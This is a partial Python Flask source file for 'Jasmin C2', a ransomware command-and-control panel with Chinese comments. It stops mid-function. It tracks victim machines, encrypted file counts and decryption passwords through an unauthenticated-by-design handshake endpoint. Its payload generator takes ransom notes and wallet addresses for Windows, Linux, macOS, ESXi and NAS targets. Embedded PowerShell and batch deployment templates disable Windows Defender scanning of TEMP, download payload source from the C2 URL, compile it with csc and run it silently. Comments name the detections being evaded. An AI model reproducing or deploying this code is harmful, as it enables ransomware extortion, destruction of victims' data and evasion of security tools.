#!/usr/bin/env python3
"""Jasmin C2 — Python Flask Backend with MySQL + Web Install Wizard"""
import os, re, secrets, json, datetime, hashlib, time, shutil, sys, platform

# ── 跨平台文件锁 ──
# fcntl 仅存在于 Unix；Windows 无此模块，直接 import 会让整个应用启动即崩溃。
# Windows 用 msvcrt.locking 提供等价的互斥锁。
_IS_WINDOWS = platform.system() == 'Windows'
if _IS_WINDOWS:
    import msvcrt
else:
    import fcntl

def _flock_ex(fh):
    """获取排他锁（跨平台）"""
    try:
        if _IS_WINDOWS:
            msvcrt.locking(fh.fileno(), msvcrt.LK_LOCK, 1)
        else:
            fcntl.flock(fh.fileno(), fcntl.LOCK_EX)
    except Exception:
        pass

def _flock_sh(fh):
    """获取共享锁（跨平台）"""
    try:
        if _IS_WINDOWS:
            msvcrt.locking(fh.fileno(), msvcrt.LK_RLCK, 1)
        else:
            fcntl.flock(fh.fileno(), fcntl.LOCK_SH)
    except Exception:
        pass

def _flock_un(fh):
    """释放锁（跨平台）"""
    try:
        if _IS_WINDOWS:
            try:
                fh.seek(0)
                msvcrt.locking(fh.fileno(), msvcrt.LK_UNLCK, 1)
            except Exception:
                pass
        else:
            fcntl.flock(fh.fileno(), fcntl.LOCK_UN)
    except Exception:
        pass
from urllib.parse import quote_plus
from functools import wraps
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, send_file, flash, Response
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.exc import IntegrityError
import bcrypt as _bcrypt
from werkzeug.security import generate_password_hash, check_password_hash

def _verify_password(stored_hash, password):
    """兼容PHP bcrypt ($2y$) 和 werkzeug hash"""
    h = stored_hash
    if h.startswith('$2y$') or h.startswith('$2b$') or h.startswith('$2a$'):
        h = h.replace('$2y$','$2b$')
        return _bcrypt.checkpw(password.encode('utf-8'), h.encode('utf-8'))
    return check_password_hash(h, password)

app = Flask(__name__)

# nginx 只设 X-Forwarded-For / X-Real-IP，不启用 ProxyFix 的话
# request.remote_addr 恒为 nginx 容器 IP —— 受害者 IP 全记错、限流 key 也全同名。
# ★ 但 ProxyFix 必须【有门禁】：它无条件采信 X-Forwarded-For，若单机部署
#   （php/python 直接暴露端口、前面没有 nginx）也启用，攻击者每个请求换一个
#   XFF 就能拿到全新限流键 —— 登录/改密限速形同虚设，受害者 IP 也可随意伪造。
#   仅当 TRUST_PROXY=1（集群编排注入，前面确有可信反代）时才启用，
#   与 PHP 端 client_ip() 的信任模型一致。
_trust_proxy = (os.environ.get('TRUST_PROXY') or '').strip()
if _trust_proxy not in ('', '0'):
    try:
        from werkzeug.middleware.proxy_fix import ProxyFix
        app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)
    except Exception:
        pass

CONFIG_FILE = os.path.join(os.path.dirname(__file__), 'config.json')
PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), 'payloads')
TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), 'templates', 'payloads')
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def load_config():
    if os.path.exists(CONFIG_FILE):
        return json.load(open(CONFIG_FILE))
    return {}

def is_installed():
    cfg = load_config()
    return cfg.get('installed', False)

# ── 文件级频率限制（与 PHP 端 includes/ratelimit.php 对齐）──
# ★ 此前的登录/改密限速把计数存在 session 里 —— 攻击者每次请求丢掉 cookie
#   就是一个"全新会话"，失败计数归零，限速形同虚设（PHP 端早已因此改成
#   文件级 + flock）。这里改为【共享卷】上的原子计数器，多副本也可见。
# 存储: payloads/.rl_<sha1(key)[:16]>，内容为 JSON 数组的时间戳（滑动窗口）。
def _rl_path(key):
    return os.path.join(PAYLOAD_DIR, '.rl_' + hashlib.sha1(key.encode('utf-8')).hexdigest()[:16])

def _rl_read(path, now, window):
    try:
        with open(path, 'r') as fh:
            _flock_sh(fh)
            data = json.load(fh) or []
    except Exception:
        return []
    return [t for t in data if isinstance(t, (int, float)) and now - t < window]

def _rl_check(key, limit=10, window=300):
    """返回 (blocked, count)。只读不写入。"""
    now = time.time()
    data = _rl_read(_rl_path(key), now, window)
    return (len(data) >= limit, len(data))

def _rl_hit(key, limit=10, window=300):
    """记录一次失败，返回 (blocked, count)。带排他锁重读-附加-写回，防并发丢计数。"""
    now = time.time()
    path = _rl_path(key)
    try:
        fh = open(path, 'a+')
        _flock_ex(fh)
        fh.seek(0)
        try:
            data = json.load(fh) or []
        except Exception:
            data = []
        data = [t for t in data if isinstance(t, (int, float)) and now - t < window]
        data.append(now)
        fh.seek(0); fh.truncate()
        json.dump(data, fh); fh.flush()
        _flock_un(fh); fh.close()
        return (len(data) >= limit, len(data))
    except Exception:
        return (False, 0)

def _rl_reset(key):
    try:
        os.remove(_rl_path(key))
    except Exception:
        pass

cfg = load_config()
# SECRET_KEY持久化: 优先环境变量 > config.json > 生成并保存
_sk = os.environ.get('SECRET_KEY') or cfg.get('secret_key')
if not _sk:
    _sk = secrets.token_hex(32)
    cfg['secret_key'] = _sk
    try:
        json.dump(cfg, open(CONFIG_FILE,'w'))
    except: pass
app.secret_key = _sk
db_url = cfg.get('database_url', os.environ.get('DATABASE_URL', 'sqlite:///jasmin.db'))
app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['HANDSHAKE_SECRET'] = cfg.get('handshake_secret', os.environ.get('HANDSHAKE_SECRET', 'jasmin@123'))

# Redis session (集群模式)
redis_host = cfg.get('redis_host', os.environ.get('REDIS_HOST', ''))
if redis_host:
    import redis as _redis
    from flask_session import Session
    app.config['SESSION_TYPE'] = 'redis'
    app.config['SESSION_REDIS'] = _redis.from_url(f"redis://{redis_host}:{cfg.get('redis_port', os.environ.get('REDIS_PORT', 6379))}/0")
    app.config['SESSION_PERMANENT'] = False
    app.config['SESSION_KEY_PREFIX'] = 'jasmin:'
    Session(app)

db = SQLAlchemy(app)


# ── CSRF 保护 ──
def csrf_token():
    """获取/生成当前会话的 CSRF 令牌"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']


def csrf_ok():
    """校验 POST 请求携带的 CSRF 令牌"""
    t = request.form.get('csrf_token', '')
    s = session.get('csrf_token', '')
    return bool(t) and bool(s) and secrets.compare_digest(t, s)


@app.context_processor
def _inject_csrf():
    return {'csrf_token': csrf_token}


class Admin(db.Model):
    __tablename__ = 'master'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column('admin', db.String(255), unique=True, nullable=False)
    password = db.Column('creds', db.String(255), nullable=False)

class Victim(db.Model):
    __tablename__ = 'victims'
    id = db.Column(db.Integer, primary_key=True)
    machine_name = db.Column(db.String(255))
    computer_user = db.Column(db.String(255))
    os = db.Column(db.String(100))
    date = db.Column(db.String(100))
    time = db.Column(db.String(50))
    ip = db.Column(db.String(45))
    location = db.Column(db.String(255))
    systemid = db.Column(db.String(255))
    password = db.Column(db.String(255))
    encrypted_count = db.Column(db.Integer, default=0)
    encrypted_size = db.Column(db.BigInteger, default=0)
    encrypted_types = db.Column(db.Text, default='')
    encrypted_detail = db.Column(db.Text, default='')
    total_count = db.Column(db.Integer, default=0)
    total_size = db.Column(db.BigInteger, default=0)
    is_complete = db.Column(db.SmallInteger, default=1)
    updated_at = db.Column(db.DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)


def ensure_schema():
    """幂等补齐进度条字段（老库升级用）。MySQL 不支持 ADD COLUMN IF NOT EXISTS，故先查 information_schema。"""
    try:
        insp = db.inspect(db.engine)
        cols = {c['name'] for c in insp.get_columns('victims')}
        ddls = {
            'total_count': 'ALTER TABLE victims ADD COLUMN total_count INT NOT NULL DEFAULT 0',
            'total_size': 'ALTER TABLE victims ADD COLUMN total_size BIGINT NOT NULL DEFAULT 0',
            'is_complete': 'ALTER TABLE victims ADD COLUMN is_complete TINYINT NOT NULL DEFAULT 1',
            'updated_at': 'ALTER TABLE victims ADD COLUMN updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP',
            'encrypted_detail': 'ALTER TABLE victims ADD COLUMN encrypted_detail TEXT NULL',
            'encrypted_types': 'ALTER TABLE victims ADD COLUMN encrypted_types TEXT NULL',
        }
        for name, ddl in ddls.items():
            if name not in cols:
                try:
                    db.session.execute(db.text(ddl)); db.session.commit()
                    print(f'[schema] added column {name}')
                except Exception as e:
                    db.session.rollback(); print(f'[schema] {name}: {e}')
        # 老库可能没有 systemid 唯一键（upsert 依赖）
        try:
            idx = {i['name'] for i in insp.get_indexes('victims')}
            if 'uniq_systemid' not in idx:
                try:
                    db.session.execute(db.text('ALTER TABLE victims ADD UNIQUE KEY uniq_systemid (systemid)'))
                    db.session.commit(); print('[schema] added uniq_systemid')
                except Exception as e:
                    db.session.rollback(); print(f'[schema] uniq_systemid: {e}')
        except Exception:
            pass
    except Exception as e:
        print(f'[schema] ensure_schema skipped: {e}')

def login_required(f):
    @wraps(f)
    def decorated(*args, **kw):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kw)
    return decorated

# ── Install Wizard ──
@app.route('/install', methods=['GET','POST'])
def install():
    if is_installed():
        return redirect(url_for('login'))
    step = request.args.get('step', 1, type=int)
    error = ''
    if request.method == 'POST':
        if step == 2:
            host = (request.form.get('db_host','localhost') or '').strip()
            port = (request.form.get('db_port','3306') or '').strip()
            name = (request.form.get('db_name','jasmin_db') or '').strip()
            user = (request.form.get('db_user','') or '').strip()
            pw = request.form.get('db_pass','') or ''
            secret = request.form.get('secret','jasmin@123')
            # 入参校验：库名会被直接拼进 CREATE DATABASE 语句（反引号可逃逸 => SQL 注入），
            # 其余字段会拼进连接串（@ : / ? 会改变 URL 语义）。PHP 侧一直有白名单，这里补齐。
            if not re.fullmatch(r'[A-Za-z0-9_]{1,64}', name):
                error = '数据库名只能包含字母、数字、下划线（1-64 位）'
                return render_template('install.html', step=2, error=error, env_docker=os.path.exists('/.dockerenv'))
            if not re.fullmatch(r'[A-Za-z0-9._\-]{1,255}', host):
                error = '数据库主机名格式不合法'
                return render_template('install.html', step=2, error=error, env_docker=os.path.exists('/.dockerenv'))
            if not re.fullmatch(r'\d{1,5}', port) or not (0 < int(port) < 65536):
                error = '数据库端口不合法'
                return render_template('install.html', step=2, error=error, env_docker=os.path.exists('/.dockerenv'))
            if user and not re.fullmatch(r'[A-Za-z0-9._\-]{1,64}', user):
                error = '数据库用户名格式不合法'
                return render_template('install.html', step=2, error=error, env_docker=os.path.exists('/.dockerenv'))
            url = (f'mysql+pymysql://{quote_plus(user)}:{quote_plus(pw)}@'
                   f'{host}:{port}/{name}?charset=utf8mb4')
            try:
                import pymysql
                conn = pymysql.connect(host=host,port=int(port),user=user,password=pw)
                cur = conn.cursor()
                # 此处虽已白名单，仍用参数化形式防御未来改动
                cur.execute("CREATE DATABASE IF NOT EXISTS `%s` DEFAULT CHARACTER SET utf8mb4" % name)
                conn.close()
                cfg = load_config()
                cfg.update({'database_url':url,'handshake_secret':secret,'installed':False})
                json.dump(cfg, open(CONFIG_FILE,'w'))
                app.config['SQLALCHEMY_DATABASE_URI'] = url
                app.config['HANDSHAKE_SECRET'] = secret
                db.engine.dispose()
                with app.app_context():
                    db.create_all()
                # 与 PHP 侧 install.php 的 $_SESSION['install_db_ok'] 对齐：
                # 只有「本会话真的完成过第 2 步」才允许第 3 步建号。
                session['install_db_ok'] = True
                return redirect(url_for('install', step=3))
            except Exception as e:
                error = f'数据库连接失败: {e}'
        elif step == 3:
            # ★ 门禁 + CSRF，两者此前都没有。
            # PHP 侧 install.php:100 一直有 $_SESSION['install_db_ok'] 校验；
            # Python 侧缺了它，而第 3 步做的是 DELETE + INSERT 管理员 ——
            # 也就是说在 installed 还是 False 的窗口期，任何人都能
            # POST /install?step=3&admin_user=x&admin_pass=... 直接建号或覆盖，
            # 随后控制整个 Python 面板。install.html 里也从来没有 csrf_token 字段。
            if not csrf_ok():
                error = 'CSRF 校验失败，请刷新页面重试'
            elif not session.get('install_db_ok'):
                error = '请先完成第 2 步的数据库配置'
            else:
                # 注意：此前的实现把这个建号分支写成独立的
                # `elif step == 3 and session.get('install_db_ok') and csrf_ok()`,
                # 而上面的 `elif step == 3` 只在校验失败时才会走到这里再向下——
                # 但实际上第一个 `elif step == 3` 只要 step==3 就必然命中（只设置
                # error、不 return），第二个 elif 永远不可达 -> 管理员永远建不出来，
                # 安装流程卡死在第 3 步。现把建号逻辑并入本 else 分支修复。
                au = request.form.get('admin_user','admin')
                ap_ = request.form.get('admin_pass','')
                ap2 = request.form.get('admin_pass2','')
                # 口令/用户名策略必须与 PHP 侧 install.php:117-122 一致：
                # 此前这里只校验 len<6 且【完全不校验用户名】，而两面板共用同一张
                # master 表 —— 等于可以从 Python 侧建出一个 6 位弱口令、
                # 或含空格/引号等怪用户名的管理员，绕过 PHP 侧更严的准入。
                if not re.fullmatch(r'[A-Za-z0-9_.\-]{1,64}', au or ''):
                    error = '用户名只能包含字母、数字、下划线、点、连字符（1-64 位）'
                elif len(ap_) < 8:
                    error = '密码至少8位'
                elif len(ap_.encode('utf-8')) > 72:
                    error = '密码过长（最长 72 字节）'
                elif ap_ != ap2:
                    error = '两次密码不一致'
                elif sum(bool(re.search(p, ap_)) for p in (r'[a-z]', r'[A-Z]', r'[0-9]', r'[^a-zA-Z0-9]')) < 2:
                    error = '密码需包含小写字母、大写字母、数字、符号中的至少两类'
                else:
                    with app.app_context():
                        Admin.query.filter_by(username=au).delete()
                        # 必须与 PHP 端一致用 bcrypt($2y$)：两面板共用同一个 master 表，
                        # werkzeug 默认的 scrypt 哈希 PHP 的 password_verify 认不出来。
                        # ★ 注意：bcrypt 库的 gensalt() 只接受 prefix=b'2a'/b'2b'，
                        #   传 b'2y' 会抛 ValueError（"Supported prefixes are b'2a' or b'2b'"），
                        #   导致整步 500。正确做法：默认生成 $2b$，再把标识改成 $2y$
                        #   （2b 与 2y 算法完全相同，PHP password_verify 两者都认）。
                        _h = _bcrypt.hashpw(ap_.encode('utf-8'), _bcrypt.gensalt(rounds=10)).decode('utf-8')
                        _h = '$2y$' + _h[4:]
                        db.session.add(Admin(username=au, password=_h))
                        db.session.commit()
                    cfg = load_config()
                    cfg['installed'] = True
                    json.dump(cfg, open(CONFIG_FILE,'w'))
                    session.pop('install_db_ok', None)   # 用后即焚，防重放
                    return redirect(url_for('install', step=4))
    return render_template('install.html', step=step, error=error,
        env_docker=os.path.exists('/.dockerenv'))

# ── Auth ──
@app.route('/')
def index():
    if not is_installed(): return redirect(url_for('install'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET','POST'])
def login():
    if not is_installed(): return redirect(url_for('install'))
    if 'username' in session: return redirect(url_for('dashboard'))
    if request.method == 'POST':
        if not csrf_ok():
            flash('会话已过期或请求非法，请重试', 'error')
            return render_template('login.html')
        u = request.form.get('username','')
        p = request.form.get('password','')
        # 限速键与 PHP 端一致：login|ip|username（文件级，丢 cookie 无法绕过）
        ip = request.remote_addr or 'unknown'
        rl_key = f'login|{ip}|{u}'
        blocked, _ = _rl_check(rl_key, 10, 300)
        if blocked:
            flash('登录尝试过多，请5分钟后再试', 'error')
            return render_template('login.html')
        admin = Admin.query.filter_by(username=u).first()
        if admin and _verify_password(admin.password, p):
            _rl_reset(rl_key)
            session['username'] = admin.username
            return redirect(url_for('dashboard'))
        _rl_hit(rl_key, 10, 300)
        flash('Access Denied','error')
    return render_template('login.html')

@app.route('/logout', methods=['POST'])
def logout():
    # 仅 POST + CSRF：防止 <img src="/logout"> 之类的强制登出（登出 CSRF）
    if not csrf_ok():
        return 'CSRF 校验失败', 403
    session.clear()
    return redirect(url_for('login'))


# ── 修改管理员密码 ──
@app.route('/change_password', methods=['POST'])
@login_required
def change_password():
    if not csrf_ok():
        return jsonify(ok=False, msg='CSRF 校验失败，请刷新页面重试'), 403
    import re as _re
    # 文件级限速（同 PHP 端 change_password.php）：丢 cookie 不能绕过
    rl_key = f'pw|{request.remote_addr or "unknown"}'
    blocked, _ = _rl_check(rl_key, 8, 600)
    if blocked:
        return jsonify(ok=False, msg='尝试过于频繁，请 10 分钟后再试'), 429

    cur  = request.form.get('current_password', '')
    new  = request.form.get('new_password', '')
    new2 = request.form.get('confirm_password', '')

    admin = Admin.query.filter_by(username=session.get('username')).first()
    if (not admin) or (not _verify_password(admin.password, cur)):
        _rl_hit(rl_key, 8, 600)
        return jsonify(ok=False, msg='当前密码不正确')

    if len(new) < 8:
        return jsonify(ok=False, msg='新密码至少 8 位')
    if len(new.encode('utf-8')) > 72:
        return jsonify(ok=False, msg='新密码过长（最长 72 字节）')
    if new != new2:
        return jsonify(ok=False, msg='两次输入的新密码不一致')
    if secrets.compare_digest(cur.encode('utf-8'), new.encode('utf-8')):
        return jsonify(ok=False, msg='新密码不能与当前密码相同')
    classes = sum(bool(_re.search(p, new)) for p in (r'[a-z]', r'[A-Z]', r'[0-9]', r'[^a-zA-Z0-9]'))
    if classes < 2:
        return jsonify(ok=False, msg='新密码需包含小写字母、大写字母、数字、符号中的至少两类')

    h = _bcrypt.hashpw(new.encode('utf-8'), _bcrypt.gensalt()).decode('utf-8')
    if h.startswith('$2b$'):
        h = '$2y$' + h[4:]        # 转成 PHP password_verify 兼容的标识
    admin.password = h
    db.session.commit()

    _rl_reset(rl_key)
    # 写到 payloads/ 共享卷：两个 python 副本与两个 php 副本看到的是同一份，
    # 而 entrypoint 启动时正是读这个路径来决定要不要重建管理员。
    # 此前写在 /app/.pw_changed —— 那是镜像层，容器一重建就没了，
    # 而且没有任何 entrypoint 读它，等于标记白写（口令照样被重置）。
    for _m in (os.path.join(PAYLOAD_DIR, '.pw_changed'),
               os.path.join(os.path.dirname(__file__), '.pw_changed')):
        try:
            open(_m, 'w').write(datetime.datetime.now().isoformat())
        except Exception:
            pass
    return jsonify(ok=True, msg='密码已更新，请使用新密码重新登录')

# ── Dashboard ──
# Windows 投递命令模板（PowerShell 原生命令 + cmd/bat 等价版）。
#
# 【为什么放在服务端而不是硬编码进 dashboard.html 的 JS 字符串】
# 旧实现整段是 cmd/bat 语法（`::` 注释、`%TEMP%`、`%WINDIR%`）却夹杂
# `powershell -c`；现代 Windows 默认终端是 PowerShell，用户粘进去后
# `::` 解析失败、`%TEMP%`/`%WINDIR%` 不展开，表现就是「载荷无法运行」。
# 改为下发 PowerShell 原生命令，并单独提供可直接存为 .bat 的 cmd 版本。
# __URL__ 由前端替换为实际载荷地址。
_WIN_DEPLOY_PS = r"""# ★ Windows 投递 — PowerShell 原生命令（请以【管理员】身份运行）
#   Windows Defender 会两步拦截：① 按编译产物判毒 Trojan:MSIL/Lazy.BAC!MTB
#   （exe 一诞生就被实时扫描拦掉）② 按投递命令行判毒 Trojan:Win32/PowExcEnv.ZA!MTB。
#   因此必须【先放行 → 再下载 → 再编译 → 再运行】，顺序反了救不回来。
#   若本机没有管理员权限，请先手动关闭 Defender 实时保护再执行。

# ── 步1 放行 Defender（放行整个 TEMP 目录；单独放行文件对新建 exe 不可靠）──
Add-MpPreference -ExclusionPath $env:TEMP -EA SilentlyContinue

# ── 步2 下载源码 ──
$u='__URL__'
$cs="$env:TEMP\j.cs"
$exe="$env:TEMP\j.exe"
Invoke-WebRequest -Uri $u -OutFile $cs -UseBasicParsing

# ── 步3 编译（自动回退到任意可用的 csc.exe：64 位 → 32 位 → PATH）──
$csc="$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if(!(Test-Path $csc)){ $csc="$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe" }
if(!(Test-Path $csc)){ $csc=(Get-Command csc.exe -EA SilentlyContinue).Source }
if(!$csc){ Write-Host "[X] 未找到 csc.exe —— 请安装 .NET Framework 4.x" -Fore Red; return }
& $csc /nologo /target:winexe /out:$exe $cs
if(!(Test-Path $exe)){ Write-Host "[X] 编译失败（见上方 csc 报错）" -Fore Red; return }
Write-Host "[OK] 编译完成: $exe" -Fore Green

# ── 步4 运行（载荷为静默 winexe，无回显属正常）──
Start-Process $exe

# ── 排错模式：若上面跑完看不到任何变化，用下面这行重编译为控制台程序，可看实时进度 ──
# & $csc /nologo /target:exe /out:"$env:TEMP\jd.exe" $cs; & "$env:TEMP\jd.exe"
"""

_WIN_DEPLOY_BAT = r"""@echo off
setlocal
:: ★ Windows 投递 — cmd.exe / 批处理版（请【以管理员身份】运行）
::   必须先放行 Defender，否则 exe 一诞生就被判毒 Trojan:MSIL/Lazy.BAC!MTB 而无法启动。

:: 步1 放行 Defender（放行整个 TEMP，比单独放行文件可靠）
powershell -c "Add-MpPreference -ExclusionPath '%TEMP%' -EA SilentlyContinue"

:: 步2 下载源码
powershell -c "IWR -Uri '__URL__' -OutFile '%TEMP%\j.cs' -UseBasicParsing"
if not exist "%TEMP%\j.cs" ( echo [X] 下载失败 & pause & exit /b 1 )

:: 步3 编译（自动回退：64 位 Framework → 32 位 Framework）
set "CSC=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC%" set "CSC=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
if not exist "%CSC%" ( echo [X] 未找到 csc.exe，请安装 .NET Framework 4.x & pause & exit /b 1 )
"%CSC%" /nologo /target:winexe /out:"%TEMP%\j.exe" "%TEMP%\j.cs"
if not exist "%TEMP%\j.exe" ( echo [X] 编译失败，见上方报错 & pause & exit /b 1 )
echo [OK] 编译完成: %TEMP%\j.exe

:: 步4 运行（静默载荷无回显属正常）
"%TEMP%\j.exe"
echo [OK] 已启动
endlocal
"""


@app.route('/dashboard')
@login_required
def dashboard():
    page = request.args.get('pageno', 1, type=int)
    search = request.args.get('search', '').strip()
    per_page = 10
    q = Victim.query
    if search:
        like = f'%{search}%'
        q = q.filter(db.or_(
            Victim.machine_name.like(like), Victim.computer_user.like(like),
            Victim.os.like(like), Victim.ip.like(like),
            Victim.location.like(like), Victim.systemid.like(like)))
    total = q.count()
    victims = q.order_by(Victim.id.desc()).offset((page-1)*per_page).limit(per_page).all()
    total_pages = max(1, -(-total // per_page))
    ks_path = os.path.join(PAYLOAD_DIR, '.key_secret')
    aes_key = open(ks_path).read().strip() if os.path.exists(ks_path) else 'KEY_NOT_SET'
    # 密钥管理区块：密钥是否存在 + 公钥指纹
    has_key = os.path.isfile(os.path.join(PAYLOAD_DIR, 'jasmin_private.pem.enc'))
    key_fp = ''
    if has_key:
        try:
            import hashlib
            with open(os.path.join(PAYLOAD_DIR, 'jasmin_public.pem'), 'rb') as _f:
                key_fp = hashlib.sha256(_f.read()).hexdigest()[:16]
        except Exception:
            key_fp = ''
    # 检测全库是否有进行中任务（跨分页），决定是否自动刷新
    try:
        has_active = db.session.query(Victim.id).filter(Victim.is_complete == 0).first() is not None
    except Exception:
        has_active = False
    return render_template('dashboard.html', victims=victims, page=page,
        total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION,
        aes_key=aes_key, has_active=has_active, has_key=has_key, key_fp=key_fp,
        win_deploy_ps=_WIN_DEPLOY_PS, win_deploy_bat=_WIN_DEPLOY_BAT)

# ── Handshake ──
@app.route('/health')
def health():
    return jsonify(status='ok', time=datetime.datetime.now().isoformat())

@app.route('/handshake', methods=['POST'])
def handshake():
    _got = request.form.get('handshake', '')
    _want = app.config['HANDSHAKE_SECRET'] or ''
    if not _want:
        return 'Handshake secret not configured', 503
    if not isinstance(_got, str) or not secrets.compare_digest(_got.encode('utf-8'), _want.encode('utf-8')):
        return 'Invalid', 403
    f = request.form
    # systemid 是 UNIQUE KEY + 查询条件，且列宽 255：攻击者可传超长值触发
    # MySQL 严格模式 DataError；这里限制长度并剥离非可见字符，防止破坏约束。
    systemid = (f.get('systemid', '') or '')[:255]
    def _i(k, d=0):
        try: return int(f.get(k, d) or d)
        except: return d
    ec, es = _i('encrypted_count'), _i('encrypted_size')
    tc, ts = _i('total_count'), _i('total_size')
    et, ed = f.get('encrypted_types', ''), f.get('encrypted_detail', '')
    is_complete = 1 if str(f.get('is_complete', '1')) not in ('0', 'false', 'False') else 0

    # 按 systemid upsert：同一主机多次心跳（进度上报）更新同一行，不产生重复记录。
    # systemid 在表上是 UNIQUE KEY，而空 systemid 会让每次心跳都去新建一行
    # systemid='' 的记录 —— 第二次就撞唯一键抛 IntegrityError → HTTP 500，
    # 该主机的心跳从此永久丢失。PHP 侧靠 ON DUPLICATE KEY UPDATE 天然规避，
    # Python 侧必须自己补一个稳定的兜底 id 才能等价。
    if not systemid:
        _seed = f"{f.get('machine_name','')}|{f.get('computer_user','')}|{request.remote_addr}"
        systemid = 'auto-' + hashlib.sha256(_seed.encode('utf-8')).hexdigest()[:32]
    # 受害者回显字段全部净化：这些值会落库后渲染进管理员面板
    # （onclick 属性 / JS innerHTML / <pre>），攻击者可控且无需认证即可提交，
    # 若含 <script>、引号、换行等即可在已登录管理员浏览器上执行任意 JS。
    # 白名单式净化：保留安全可见字符，其余一律剥除，从根上杜绝存储型 XSS。
    def _safe(s, maxlen=200):
        s = re.sub(r'[^\x20-\x7E]', '', (s or ''))
        return s[:maxlen]
    # time 列是 MySQL 的 TIME 类型，载荷送 "HH:MM:SS"。非法值或空串在严格模式下
    # 会让整个心跳 500 —— 该主机从此不再出现在面板上。宁可时间不准也不能丢心跳。
    _t = (f.get('time', '') or '').strip()[:8]
    if not re.match(r'^[0-2]\d:[0-5]\d:[0-5]\d$', _t):
        _t = datetime.datetime.now().strftime('%H:%M:%S')

    def _apply(v):
        # 各字段截断上限与 victims 表列宽对齐（machine_name/computer_user/location 255，
        # os/date 100，time 50，ip 45），避免 MySQL 严格模式 DataError 导致整次心跳 500。
        v.machine_name = _safe(f.get('machine_name', ''), 200)
        v.computer_user = _safe(f.get('computer_user', ''), 200)
        v.os = _safe(f.get('os', ''), 90)
        v.date = _safe(f.get('date', ''), 90)
        v.time = _t
        # ip：仅允许 IPv4/IPv6/主机名 可见字符（数字、点、冒号、字母、连字符）
        _ip = _safe(f.get('ip', ''), 40)
        _ip = re.sub(r'[^0-9A-Za-z.:\-]', '', _ip)
        v.ip = _ip or request.remote_addr
        v.location = _safe(f.get('location', ''), 200)
        v.password = _safe(f.get('password', ''), 200)
        # 计数只增不减，避免进度心跳把已有统计清零
        if ec > 0 or (v.encrypted_count or 0) == 0: v.encrypted_count = ec
        if es > 0 or (v.encrypted_size or 0) == 0: v.encrypted_size = es
        if tc > 0 or (v.total_count or 0) == 0: v.total_count = tc
        if ts > 0 or (v.total_size or 0) == 0: v.total_size = ts
        if et: v.encrypted_types = _safe(et, 2000)
        if ed and ed != '{}': v.encrypted_detail = _safe(ed, 4000)
        v.is_complete = is_complete
        v.updated_at = datetime.datetime.utcnow()

    def _load():
        return Victim.query.filter_by(systemid=systemid).first()

    v = _load()
    if v is None:
        v = Victim(systemid=systemid)
        db.session.add(v)
    _apply(v)
    try:
        db.session.commit()
    except IntegrityError:
        # ★ 并发心跳竞态修复 ★
        # 载荷的进度心跳跑在后台线程（Tick 每 8s 一次，且 P_LAST_BEACON 初值为 0
        # 使第一次 Tick 立刻触发），收尾心跳可能与它同时在途。两个请求都 SELECT
        # 到 None，各自 INSERT，后到者撞 victims.uniq_systemid 抛 IntegrityError →
        # HTTP 500，该主机的心跳从此永久丢失。实测复现：id=15 的进度行先落库，
        # 收尾心跳即 500。
        # 回滚后转为更新既有行；极端情况下连行都查不到就安静放弃本次心跳，
        # 绝不把 500 吐给被控端（那等于永久失联）。
        db.session.rollback()
        v = _load()
        if v is None:
            app.logger.warning('[handshake] systemid=%s 并发插入后仍查不到行，跳过本次心跳', systemid)
            return 'handshake completed'
        _apply(v)
        try:
            db.session.commit()
        except IntegrityError:
            db.session.rollback()
            app.logger.warning('[handshake] systemid=%s 二次提交仍冲突，跳过本次心跳', systemid)
    return 'handshake completed'


# ── Payload Generator ──
@app.route('/generate', methods=['POST'])
@login_required
def generate():
    if not csrf_ok():
        return jsonify(ok=False, msg='CSRF 校验失败，请刷新页面重试'), 403
    plat = request.form.get('platform','')
    c2 = request.form.get('c2_url','').strip()
    sec = request.form.get('secret', app.config['HANDSHAKE_SECRET']).strip()
    ransom = {
        'title': request.form.get('ransom_title','YOUR FILES HAVE BEEN ENCRYPTED'),
        'contact': request.form.get('ransom_contact',''),
        'body': request.form.get('ransom_body',''),
        'price': request.form.get('ransom_price',''),
        'wallet': request.form.get('ransom_wallet',''),
    }
    # NAS 只加密数据卷，绝不含系统分区
    if plat not in ('win','linux','macos','esxi','qnap','synology'):
        return jsonify(ok=False, msg='无效平台')

    # ── 入参白名单 ──
    # 此前 Python 侧【完全没有校验】，而 PHP 侧 generate.php 一直有。
    # 两个后台生成的是同一批模板，等于"换个端口访问就能绕过后台的所有限制"。
    # 模板里是 C2='{{C2_URL}}' / SECRET='{{HANDSHAKE}}'，不校验就等同于
    # 把任意代码写进生成的载荷 —— 已实测：secret 传
    #   x';import os;os.system('id');#
    # 生成出的 .py 能通过 ast.parse，也就是注入的代码是合法可执行的。
    if not re.fullmatch(r'https?://[A-Za-z0-9._\-]+(:\d{1,5})?(/[A-Za-z0-9._\-]*)*', c2):
        return jsonify(ok=False, msg='回连地址格式不合法（需为 http(s)://主机[:端口][/路径]）')
    # 与 PHP 侧同一条白名单：排除会破坏模板字符串字面量的 ' " ` \ 及空白
    if not re.fullmatch(r'[A-Za-z0-9_\-@.!$%&*+=]{1,64}', sec):
        return jsonify(ok=False, msg='握手密钥只能包含字母、数字及 - _ @ . ! $ % & * + = （1-64 位，不能有引号/反斜杠/空格）')
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    # 载荷文件名是载荷可匿名下载时的唯一屏障（时间戳可枚举），
